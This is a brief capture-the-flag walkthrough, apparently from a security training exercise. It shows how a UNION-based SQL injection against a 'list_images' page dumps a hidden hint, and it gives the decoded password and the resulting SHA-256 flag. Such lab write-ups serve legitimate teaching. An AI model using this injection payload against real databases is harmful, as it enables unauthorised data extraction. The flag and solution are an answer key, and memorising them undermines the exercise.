# list_images

Following the same logic than the [members breach](../../members/ressources/walktrough.md), we can use an sql injection with the
input `1 UNION SELECT title, comment FROM list_images`, we got
```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```
---
Decoded it give us `albatroz` then with sha-256
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
